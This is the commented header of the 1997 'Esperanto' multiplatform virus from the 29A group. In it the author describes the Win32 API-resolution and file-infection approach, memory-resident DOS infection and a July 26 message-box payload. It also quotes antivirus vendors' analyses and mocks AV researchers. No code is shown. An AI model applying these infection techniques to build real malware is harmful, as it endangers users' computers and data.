</span><span class="sc1">; written and compiled in 32-bit protected mode, and that is what it is able</span><span class="sc0">
</span><span class="sc1">; to work in: Win32 platforms (Win32s/Windows95/WindowsNT). When it's execu-</span><span class="sc0">
</span><span class="sc1">; ted it first gets the base address  of its  host and pushes its real entry</span><span class="sc0">
</span><span class="sc1">; point, and later performs several actions in order to  stay compatible and</span><span class="sc0">
</span><span class="sc1">; portable between all the Win32 platforms. These actions consist on getting</span><span class="sc0">
</span><span class="sc1">; the previously stored RVA of GetModuleHandleA and  calling this API in or-</span><span class="sc0">
</span><span class="sc1">; der to  get the address of the KERNEL32 module, and later getting the also</span><span class="sc0">
</span><span class="sc1">; previously stored RVA of GetProcAddress in order to use it  and thus be a-</span><span class="sc0">
</span><span class="sc1">; ble to get the address of all the APIs needed by Esperanto. If the RVAs of</span><span class="sc0">
</span><span class="sc1">; GetModuleHandleA and GetProcAddress were not stored for some reason, Espe-</span><span class="sc0">
</span><span class="sc1">; ranto would use its own undocumented routines in order to get the base ad-</span><span class="sc0">
</span><span class="sc1">; dress of KERNEL32 and, inside  the export table of the latter, the address</span><span class="sc0">
</span><span class="sc1">; of the GetProcAddress API function.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Once these steps are done Esperanto calls the GetLocalTime API in order to</span><span class="sc0">
</span><span class="sc1">; know if the current date is  the one required by  the payload to activate.</span><span class="sc0">
</span><span class="sc1">; This payload and its effects are fully described below. If the date is not</span><span class="sc0">
</span><span class="sc1">; the one the payload needs to activate then the execution will continue and</span><span class="sc0">
</span><span class="sc1">; the virus will  use the FindFirstFileA/FindNextFileA APIs in order to find</span><span class="sc0">
</span><span class="sc1">; some files to infect. Again, the infection will be controlled and Esperan-</span><span class="sc0">
</span><span class="sc1">; to will hit a maximum of three files per run. The checks performed by this</span><span class="sc0">
</span><span class="sc1">; module are the same than the ones performed by the DOS module, and the in-</span><span class="sc0">
</span><span class="sc1">; fection routines consist on exactly the same, besides in two points: first</span><span class="sc0">
</span><span class="sc1">; of them is the fact that this module uses  file mapping in memory in order</span><span class="sc0">
</span><span class="sc1">; to make things easier and save bytes; and second  is that this module does</span><span class="sc0">
</span><span class="sc1">; not infect  NewEXE files, as divisions with 32-bit integers when DX is not</span><span class="sc0">
</span><span class="sc1">; equal to zero  cause troubles; the solution would be either only infecting</span><span class="sc0">
</span><span class="sc1">; NewEXEs &lt; 0ffffh (as done with EXEs) or making a 16-bit division. I didn't</span><span class="sc0">
</span><span class="sc1">; like any of them so i avoided a headache just by skipping NewEXE files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.5. Union makes the power</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; It's not about the fact that this virus has been written to be in the wild</span><span class="sc0">
</span><span class="sc1">; or shit like that. In fact i did not take care about restoring file attri-</span><span class="sc0">
</span><span class="sc1">; butes, date or time, because i wrote this just to "prove my point", not to</span><span class="sc0">
</span><span class="sc1">; release it and let it survive in  the  wild, so i don't care it being easy</span><span class="sc0">
</span><span class="sc1">; to  detect or unveiling  its presence. It was just a challenge for myself,</span><span class="sc0">
</span><span class="sc1">; not a defiance for innocent average-level computer users.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It's about its versatility. You could see the virus consists on four modu-</span><span class="sc0">
</span><span class="sc1">; les. Each of those modules was written individually and thus would be able</span><span class="sc0">
</span><span class="sc1">; to work with no need of the presence of the resting modules (except of the</span><span class="sc0">
</span><span class="sc1">; Windows 3.1x one, which shares its infection routines because of optimiza-</span><span class="sc0">
</span><span class="sc1">; tion reasons). Separately they would be normal infectors. But they all to-</span><span class="sc0">
</span><span class="sc1">; gether are a unique virus in its class. For the same reason, the infection</span><span class="sc0">
</span><span class="sc1">; ratio and the versatility of the virus are much bigger than if it would be</span><span class="sc0">
</span><span class="sc1">; separated into independent modules: the DOS module goes memory resident in</span><span class="sc0">
</span><span class="sc1">; order to infect files while the Windows 3.1x and the Win32 ones use runti-</span><span class="sc0">
</span><span class="sc1">; me infection. But what happens if the virus (the DOS module) is memory re-</span><span class="sc0">
</span><span class="sc1">; sident and Windows 3.1x or a Win32  platform is loaded? the result is that</span><span class="sc0">
</span><span class="sc1">; Esperanto will then use both memory *and* runtime infection as the DOS mo-</span><span class="sc0">
</span><span class="sc1">; dule is able to stay resident also under Windows and both Windows 3.1x and</span><span class="sc0">
</span><span class="sc1">; Win32 call the original 4eh/4fh services of interrupt 21h in order to find</span><span class="sc0">
</span><span class="sc1">; files. Esperanto would be, as you can see, much more infectious. And don't</span><span class="sc0">
</span><span class="sc1">; see this as a remote possibility, as WIN.COM is usually the first file the</span><span class="sc0">
</span><span class="sc1">; virus infects from its Windows 3.1x module, for instance.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Finally i would like to add a clarification about the virus. You will pro-</span><span class="sc0">
</span><span class="sc1">; bably find strange or non-sense things on it, or even things you can't un-</span><span class="sc0">
</span><span class="sc1">; derstand or think they're wrong or could be improved. And you will kind be</span><span class="sc0">
</span><span class="sc1">; right and kind be wrong... "they are not bugs, they are features". What do</span><span class="sc0">
</span><span class="sc1">; are bugs are some included on purpose in order to stop the virus spreading</span><span class="sc0">
</span><span class="sc1">; fast so it can't go too far in the wild.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Note again that the purpose of this virus is not to infect people and thus</span><span class="sc0">
</span><span class="sc1">; become widespread in the wild; its real objective is summed up in the pre-</span><span class="sc0">
</span><span class="sc1">; tty famous Nike slogan... "just do it" ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 3. Payload</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This virus took its name after the universal language Esperanto. This lan-</span><span class="sc0">
</span><span class="sc1">; guage was invented in 1887 by L.L.Zamenhof, a polish doctor. Esperanto was</span><span class="sc0">
</span><span class="sc1">; designed to be the second language of everyone, and then was invented with</span><span class="sc0">
</span><span class="sc1">; no irregularities and/or exceptions, so everybody would be able to rapidly</span><span class="sc0">
</span><span class="sc1">; and easily learn it and communicate with other Esperanto speakers. It ini-</span><span class="sc0">
</span><span class="sc1">; tially had a lot of success, but its growing process was stopped by the II</span><span class="sc0">
</span><span class="sc1">; World War as lots of its speakers died in it. Since about ten years ago it</span><span class="sc0">
</span><span class="sc1">; is experiencing a new peak, and its use has been recommended many times by</span><span class="sc0">
</span><span class="sc1">; international organisms such as UNESCO, which also stress its paedagogy as</span><span class="sc0">
</span><span class="sc1">; Esperanto, once learnt, makes the learning process of other languages much</span><span class="sc0">
</span><span class="sc1">; easier. Today, Esperanto is spoken by about ten million people.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I found some parallelism between this language and my virus because as the</span><span class="sc0">
</span><span class="sc1">; language goes beyond any culture, race or whatsoever the virus goes beyond</span><span class="sc0">
</span><span class="sc1">; any processor, platform or file format. And also because i personally sup-</span><span class="sc0">
</span><span class="sc1">; port and speak Esperanto it seemed to me the perfect name for my virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The payload activates every year on july 26th, which was the release date,</span><span class="sc0">
</span><span class="sc1">; in 1887, of "Internacia Lingvo" (International Language), by Zamenhof, the</span><span class="sc0">
</span><span class="sc1">; first book written in Esperanto. Today there are over ten thousand titles.</span><span class="sc0">
</span><span class="sc1">; The virus payload will activate only when running in a Win32 platform, and</span><span class="sc0">
</span><span class="sc1">; consists on showing the text below within a message box. When the user ac-</span><span class="sc0">
</span><span class="sc1">; cepts the "ok" button the virus jumps straight to the host, without infec-</span><span class="sc0">
</span><span class="sc1">; ting any file (that's its only vacancy time).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Never mind your culture / Ne gravas via kulturo,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will go beyond it / Esperanto preterpasos gxin;</span><span class="sc0">
</span><span class="sc1">;        never mind the differences / ne gravas la diferencoj,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will overcome them / Esperanto superos ilin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Never mind your processor / Ne gravas via procesoro,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will work in it / Esperanto funkcios sub gxi;</span><span class="sc0">
</span><span class="sc1">;        never mind your platform / Ne gravas via platformo,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will infect it / Esperanto infektos gxin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Now not only a human language, but also a virus...</span><span class="sc0">
</span><span class="sc1">;        Turning impossible into possible, Esperanto.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; What reads after the slash in every line is, of course, the translation of</span><span class="sc0">
</span><span class="sc1">; the english "verse" into Esperanto. And yes, i know it looks strange :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4.0 The "other side"</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; It has only passed one week after having sent the virus to two AVers. This</span><span class="sc0">
</span><span class="sc1">; is what we could get from them by the moment. Further reports and analyses</span><span class="sc0">
</span><span class="sc1">; will be referenced in the next issue of 29A.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4.1. Mikko Hyppnen speaks (F-Prot)</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; (*) http://www.DataFellows.com/v-descs/esperant.htm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; NAME: Esperanto</span><span class="sc0">
</span><span class="sc1">; TYPE: Resident COM/EXE-files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus infects lots of different executables:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When running in DOS and Windows 3.1x it will infect:</span><span class="sc0">
</span><span class="sc1">;  - DOS COM files</span><span class="sc0">
</span><span class="sc1">;  - DOS EXE files</span><span class="sc0">
</span><span class="sc1">;  - Windows 3.x NewEXE files,</span><span class="sc0">
</span><span class="sc1">;  - Windows 95 PE EXE files</span><span class="sc0">
</span><span class="sc1">;  - Windows NT PE EXE files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When running in Windows 95, Windows NT and Win32s it will infect:</span><span class="sc0">
</span><span class="sc1">;  - DOS COM files</span><span class="sc0">
</span><span class="sc1">;  - DOS EXE files</span><span class="sc0">
</span><span class="sc1">;  - Windows 95 PE EXE files</span><span class="sc0">
</span><span class="sc1">;  - Windows NT PE EXE files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus carries a dropper of a Macintosh virus in it's code.</span><span class="sc0">
</span><span class="sc1">; This will work under Mac and PowerMac and will infect:</span><span class="sc0">
</span><span class="sc1">;  - Mac OS applications</span><span class="sc0">
</span><span class="sc1">;  - Extensions</span><span class="sc0">
</span><span class="sc1">;  - Control panels</span><span class="sc0">
</span><span class="sc1">;  - The System File</span><span class="sc0">
</span><span class="sc1">;  - The Mac OS Finder</span><span class="sc0">
</span><span class="sc1">;  - The DA Handler</span><span class="sc0">
</span><span class="sc1">;  - The Desktop File</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When Esperanto is running on a PC, it will stay resident and infect</span><span class="sc0">
</span><span class="sc1">; programs when they are accessed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When such COM and EXE files are taken to a Macintosh or a PowerMac and</span><span class="sc0">
</span><span class="sc1">; executed under a PC emulator such as SoftPC or SoftWindows, they will</span><span class="sc0">
</span><span class="sc1">; execute as Mac programs. This happens because Esperanto adds a special</span><span class="sc0">
</span><span class="sc1">; resource-like add-on to PC files. Such programs will drop a Mac-specific</span><span class="sc0">
</span><span class="sc1">; virus which will continue spreading on Macintosh computers. The Mac</span><span class="sc0">
</span><span class="sc1">; version of the virus will not spread back to PC users. PC version of</span><span class="sc0">
</span><span class="sc1">; the virus won't infect Mac executables directly even if it would</span><span class="sc0">
</span><span class="sc1">; have access to them through floppies or file sharing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Esperanto activates every year on July 26th. The first book in the</span><span class="sc0">
</span><span class="sc1">; international Esperanto language was released on this date. When an</span><span class="sc0">
</span><span class="sc1">; infected file is executed under Windows 95 or Windows NT on this date,</span><span class="sc0">
</span><span class="sc1">; the virus will show a dialog box with the following texts:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Never mind your culture / Ne gravas via kulturo,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will go beyond it / Esperanto preterpasos gxin;</span><span class="sc0">
</span><span class="sc1">;        never mind the differences / ne gravas la diferencoj,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will overcome them / Esperanto superos ilin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Never mind your processor / Ne gravas via procesoro,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will work in it / Esperanto funkcios sub gxi;</span><span class="sc0">
</span><span class="sc1">;        never mind your platform / Ne gravas via platformo,</span><span class="sc0">
</span><span class="sc1">;        Esperanto will infect it / Esperanto infektos gxin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Now not only a human language, but also a virus...</span><span class="sc0">
</span><span class="sc1">;        Turning impossible into possible, Esperanto.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The Mac version of Esperanto was the first new Mac virus for over two</span><span class="sc0">
</span><span class="sc1">; years when it was discovered in November 1997.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [Analysis: Mikko Hypponen, Data Fellows Ltd]</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4.2. Eugene Kaspersky speaks (AVP)</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; (*) http://www.avp.ch/avpve/file/e/esperant.stm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; Esperanto.4733</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This is a multiplatform parasitic virus. It infects DOS COM and EXE,</span><span class="sc0">
</span><span class="sc1">; Windows EXE (NE) and Windows32 EXE (PE) files. It also has a part of</span><span class="sc0">
</span><span class="sc1">; code that looks like a MDEF Macintosh resource and seems to be also a</span><span class="sc0">
</span><span class="sc1">; virus for the Macintosh. I see no way for that virus to spread from</span><span class="sc0">
</span><span class="sc1">; Macintosh to PC, and from PC to Macintosh - being executed as DOS/Win</span><span class="sc0">
</span><span class="sc1">; application the virus pays no attention for Mac files. It seems to be</span><span class="sc0">
</span><span class="sc1">; the same for infected Mac programs - the virus does not pay attention</span><span class="sc0">
</span><span class="sc1">; for DOS/Win files. I think that the only way to spread that virus from</span><span class="sc0">
</span><span class="sc1">; Mac to PC and back is to copy and run it "manually".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When an infected file is executed under DOS, the virus hooks INT 21h and</span><span class="sc0">
</span><span class="sc1">; stays memory resident. When files are executed or accessed by FindFirst/</span><span class="sc0">
</span><span class="sc1">; Next DOS calls, the virus infects them. The virus also searches for COM</span><span class="sc0">
</span><span class="sc1">; and EXE files and infects them. Being executed as Windows or Windows32</span><span class="sc0">
</span><span class="sc1">; application, the virus does not leave its TSR copy in the memory - it</span><span class="sc0">
</span><span class="sc1">; just searches for files and infects them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting the virus parses internal file format, separates DOS COM,</span><span class="sc0">
</span><span class="sc1">; EXE, NewEXE and Portable EXE files and infects them in different ways:</span><span class="sc0">
</span><span class="sc1">; writes itself to the end of DOS COM and EXE files and modifies file</span><span class="sc0">
</span><span class="sc1">; header, creates new section in Windows NE files, appends itself to the</span><span class="sc0">
</span><span class="sc1">; last section in Windows32 PE files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Being executed as Windows32 application the virus also checks the system</span><span class="sc0">
</span><span class="sc1">; time and depending on it displays the MessageBox:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  [Esperanto, by Mister Sandman/29A]</span><span class="sc0">
</span><span class="sc1">;  Never mind your culture / Ne gravas via kulturo,</span><span class="sc0">
</span><span class="sc1">;  Esperanto will go beyond it / Esperanto preterpasos gxin;</span><span class="sc0">
</span><span class="sc1">;  never mind the differences / ne gravas la diferencoj,</span><span class="sc0">
</span><span class="sc1">;  Esperanto will overcome them / Esperanto superos ilin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Never mind your processor / Ne gravas via procesoro,</span><span class="sc0">
</span><span class="sc1">;  Esperanto will work in it / Esperanto funkcios sub gxi;</span><span class="sc0">
</span><span class="sc1">;  never mind your platform / Ne gravas via platformo,</span><span class="sc0">
</span><span class="sc1">;  Esperanto will infect it / Esperanto infektos gxin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Now not only a human language, but also a virus...</span><span class="sc0">
</span><span class="sc1">;  Turning impossible into possible, Esperanto.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus also contains the text strings that are used while infecting</span><span class="sc0">
</span><span class="sc1">; Windows32 files:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  KERNEL32.DLL USER32.DLL GetModuleHandleA GetProcAddress MessageBoxA</span><span class="sc0">
</span><span class="sc1">;  CreateFileA CreateFileMappingA MapViewOfFile UnmapViewOfFile CloseHandle</span><span class="sc0">
</span><span class="sc1">;  FindFirstFileA FindNextFileA FindClose LoadLibraryA GetLocalTime</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4.3 Keith Peer speaks (AVP)</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; (*) alt.comp.virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; From - Sat Nov 22 02:03:41 1997</span><span class="sc0">
</span><span class="sc1">; From: Keith Peer &lt;keith@command-hq.com&gt;</span><span class="sc0">
</span><span class="sc1">; Newsgroups: alt.comp.virus</span><span class="sc0">
</span><span class="sc1">; Subject: New Multi-Operating System virus discovered!</span><span class="sc0">
</span><span class="sc1">; Date: Thu, 20 Nov 1997 12:54:01 -0500</span><span class="sc0">
</span><span class="sc1">; Organization: Central Command Inc.</span><span class="sc0">
</span><span class="sc1">; To: virus-l@lehigh.edu</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; November 20, 1997</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; FOR IMMEDIATE RELEASE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Renee Barnhardt</span><span class="sc0">
</span><span class="sc1">; Central Command Inc.</span><span class="sc0">
</span><span class="sc1">; 330-273-2820</span><span class="sc0">
</span><span class="sc1">; renee@command-hq.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Central Command today announces the discovery of new multi-operating</span><span class="sc0">
</span><span class="sc1">; system virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; New cross platform virus that can infect all popular desktop computers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Brunswick, OH, November 20, 1997 Central Command Inc. the U.S. distributor</span><span class="sc0">
</span><span class="sc1">; for AntiViral Toolkit Pro (AVP) announces today that a new computer virus</span><span class="sc0">
</span><span class="sc1">; has been discovered that can operate under DOS, Windows, Windows 95,</span><span class="sc0">
</span><span class="sc1">; Windows NT, and Macintosh operating systems.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "We are seeing a lot of new technology in computer viruses today. It seems</span><span class="sc0">
</span><span class="sc1">; that the virus writers are concentrating more on developing sophisticated</span><span class="sc0">
</span><span class="sc1">; viruses that extend further and infect more widely. I am sure this will</span><span class="sc0">
</span><span class="sc1">; not be the last virus we encounter that can infect DOS, Windows, Windows</span><span class="sc0">
</span><span class="sc1">; 95, Windows NT, and Macintosh operating systems, but right now this is</span><span class="sc0">
</span><span class="sc1">; the first." Said Central Command's President, Keith Peer.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This multiplatform parasitic virus named Esperanto.4733, infects DOS, COM</span><span class="sc0">
</span><span class="sc1">; and EXE programs, Windows EXE (NE) and Windows32 EXE (PE) files. It also</span><span class="sc0">
</span><span class="sc1">; has instructions that look for MDEF Macintosh resources and also operates</span><span class="sc0">
</span><span class="sc1">; under the Macintosh environment. There is no way for this virus to spread</span><span class="sc0">
</span><span class="sc1">; from Macintosh to PC, and from PC to Macintosh. When a infected program</span><span class="sc0">
</span><span class="sc1">; is started as a DOS or Windows application the virus does not execute the</span><span class="sc0">
</span><span class="sc1">; Macintosh instructions. The same effect happens when a infected Macintosh</span><span class="sc0">
</span><span class="sc1">; program is started, the virus simply ignores the DOS, and Windows</span><span class="sc0">
</span><span class="sc1">; instructions. Currently, the only way for this virus to spread from a PC</span><span class="sc0">
</span><span class="sc1">; to a Macintosh is by copying it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting the virus searches the internal file format of the</span><span class="sc0">
</span><span class="sc1">; programs, and separates DOS, COM and EXE programs, Windows, Windows 95,</span><span class="sc0">
</span><span class="sc1">; Windows NT, and Macintosh programs and infects differently.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [...Publicity...]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Central Command Inc.                AntiViral Toolkit Pro</span><span class="sc0">
</span><span class="sc1">; http://www.command-hq.com            sales@command-hq.com</span><span class="sc0">
</span><span class="sc1">; Ph: 330-273-2820                        Fax: 330-220-4129</span><span class="sc0">
</span><span class="sc1">;  -&gt;  See our website for free software evaluations!  &lt;-</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4.4. Guillermito speaks ;)</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; (*) alt.comp.virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; From - Sat Nov 22 02:04:19 1997</span><span class="sc0">
</span><span class="sc1">; From: Guillermito &lt;guillermito@pipo.com&gt;</span><span class="sc0">
</span><span class="sc1">; Newsgroups: alt.comp.virus</span><span class="sc0">
</span><span class="sc1">; Subject: Re: New Multi-Operating System virus discovered!</span><span class="sc0">
</span><span class="sc1">; Date: Fri, 21 Nov 1997 09:16:28 +0100</span><span class="sc0">
</span><span class="sc1">; Organization: INRA des Villes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Keith Peer wrote:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; &gt; This multiplatform parasitic virus named Esperanto.4733, infects DOS,</span><span class="sc0">
</span><span class="sc1">; &gt; COM and EXE programs, Windows EXE (NE) and Windows32 EXE (PE) files. It</span><span class="sc0">
</span><span class="sc1">; &gt; also has instructions that look for MDEF Macintosh resources and also</span><span class="sc0">
</span><span class="sc1">; &gt; operates under the Macintosh environment.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hey MrSandman! Lo has conseguido! Que cojonudo, tio!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Cabanas/Esperanto: 29A is the best virus group on earth.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; --</span><span class="sc0">
</span><span class="sc1">; Guillermito</span><span class="sc0">
</span><span class="sc1">; http://www.pipo.com/guillermito/darkweb/virus.html</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; My reply: lo tuyo s¡ que se sale... ;) Espero verte de nuevo en la pr¢xima</span><span class="sc0">
</span><span class="sc1">; reuni¢n de 29A este verano, a ver si esta vez no te pierdes en Madrid ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Btw, the guys at AVP don't seem to have understood very well the way Espe-</span><span class="sc0">
</span><span class="sc1">; ranto jumps from a PC to a Macintosh computer. I would also like to make a</span><span class="sc0">
</span><span class="sc1">; special mention to Alan Sollomon (aka Alan Salmon), who, resentful for not</span><span class="sc0">
</span><span class="sc1">; being one of "the chosen", tried to follow Bontchev's steps (he knows what</span><span class="sc0">
</span><span class="sc1">; i mean). This makes nothing but confirming my opinion on who in the AV si-</span><span class="sc0">
</span><span class="sc1">; de makes a serious and proffesional work and who prefers to get some noto-</span><span class="sc0">
</span><span class="sc1">; riousness by trying to create actually inexistent conflicts between VX and</span><span class="sc0">
</span><span class="sc1">; AV and even between AV and AV themselves, rather than cordiality.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "That's the way they act, that's why their products suck".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And Kaspersky... you rock, but you should stop believing you're a god. Get</span><span class="sc0">
</span><span class="sc1">; some time to learn a better english and something on Win32 viruses, try to</span><span class="sc0">
</span><span class="sc1">; approach your previous modest behavior rather than Daniloff's, and that is</span><span class="sc0">
</span><span class="sc1">; when you'll start to write again those dazzling virus analyses such as the</span><span class="sc0">
</span><span class="sc1">; unforgettable work you did with Zhengxi.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; However i still admire you.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 5. Greetings</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; I would like to thank Jacky Qwerty very especially for his big help in the</span><span class="sc0">
</span><span class="sc1">; Win32 module (as well as in some stupid bugs) :) I wouldn't have been able</span><span class="sc0">
</span><span class="sc1">; to write the Win32 module without him. What can i say man... thank you ve-</span><span class="sc0">
</span><span class="sc1">; ry much, you rock ;) Also very special thanks to GriYo, who provided to me</span><span class="sc0">
</span><span class="sc1">; as well as Jacky very valuable information and code about PE infection un-</span><span class="sc0">
</span><span class="sc1">; der Win32, when we all (Jacky, GriYo and i) were working on the subject.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A very special greeting also for Vecna, who is nowadays doing the military</span><span class="sc0">
</span><span class="sc1">; service in Brazil, his country... i'll never forget what you said about my</span><span class="sc0">
</span><span class="sc1">; virus, we all miss you and hope to see you soon, friend :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
